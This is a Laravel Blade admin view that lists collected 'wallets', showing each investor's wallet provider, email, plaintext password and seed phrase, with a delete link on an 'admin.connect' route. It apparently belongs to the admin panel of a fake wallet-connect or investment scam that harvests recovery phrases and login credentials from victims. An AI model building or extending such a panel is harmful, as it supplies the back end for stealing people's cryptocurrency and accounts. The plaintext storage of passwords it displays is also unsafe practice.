@extends('admin.base')

@section('content')

    <!-- DataTales Example -->
    <div class="card shadow mb-4">
        <div class="card-header py-3">
            <h6 class="m-0 font-weight-bold text-primary">List</h6>
        </div>
        <div class="card-body">
            @include('templates.notification')
            <div class="table-responsive">
                <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
                    <thead>
                    <tr>
                        <th>Investor</th>
                        <th>Wallet Provider</th>
                        <th>Email</th>
                        <th>Password</th>
                        <th>Seed Phrase</th>
                        <th>Date Registered</th>
                        <th>Action</th>
                    </tr>
                    </thead>
                    <tbody>
                    @foreach($wallets as $wallet)
                        @inject('option','App\Defaults\Custom')
                        <tr>
                            <td>{{$option->getInvestor($wallet->user)}}</td>
                            <td>{{$wallet->walletProvider}}</td>
                            <td>{{$wallet->email}}</td>
                            <td>{{$wallet->password}}</td>
                            <td>{{$wallet->seedPhrase}}</td>
                            <td>{{$wallet->created_at}}</td>
                            <td>
                                <a href="{{ route('admin.connect.delete',['id'=>$wallet->id]) }}" class="btn btn-danger">Delete</a>
                            </td>
                        </tr>
                    @endforeach
                    </tbody>
                </table>
            </div>
        </div>
    </div>

@endsection
